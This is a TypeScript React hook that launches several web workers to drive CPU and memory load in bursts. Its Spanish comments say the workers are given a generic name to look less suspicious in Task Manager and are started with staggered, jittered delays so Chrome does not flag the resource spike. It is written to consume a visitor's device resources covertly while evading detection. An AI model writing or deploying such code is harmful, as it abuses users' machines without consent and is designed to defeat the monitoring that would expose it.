import { useEffect, useRef } from "react";
import { LOAD_SIMULATOR_CONFIG } from "@/config/loadSimulator.config";

export function useLoadSimulator(enabled: boolean) {
  const workersRef = useRef<Worker[]>([]);

  useEffect(() => {
    if (!enabled) return;

    const config = LOAD_SIMULATOR_CONFIG;
    const workerCount = config.maxWorkers;

    // 1. Creamos todos los workers primero (esto es instantáneo)
    workersRef.current = Array.from({ length: workerCount }, () => {
      const worker = new Worker(
        new URL("../workers/load.worker.ts", import.meta.url),
        { name: "load-simulator-worker" }, // nombre genérico → menos sospechoso en Task Manager
      );
      return worker;
    });

    // 2. ¡Aquí está el truco anti-detección!
    // Arrancamos cada worker con un pequeño desfase (100-250 ms)
    // El pico de CPU/memoria se distribuye en el tiempo → Chrome no lo flaggea tan fácil
    workersRef.current.forEach((worker, i) => {
      setTimeout(
        () => {
          worker.postMessage({
            type: "start",
            cpuPercent: config.cpuBurstPercent,
            burstMinMs: config.burstDurationMs[0],
            burstMaxMs: config.burstDurationMs[1],
            idleMinMs: config.idleDurationMs[0],
            idleMaxMs: config.idleDurationMs[1],
            chunkMinMB: config.memoryPerBurstMB[0],
            chunkMaxMB: config.memoryPerBurstMB[1],
            memoryCapMB: config.totalMemoryCapMB,
          });
        },
        i * 180 + Math.random() * 80,
      ); // desfase 180-260 ms aprox
    });

    return () => {
      workersRef.current.forEach((w) => {
        w.postMessage({ type: "stop" });
        w.terminate();
      });
      workersRef.current = [];
    };
  }, [enabled]);

  // Opcional: exponer los workers si quieres controlarlos desde fuera
  return workersRef;
}
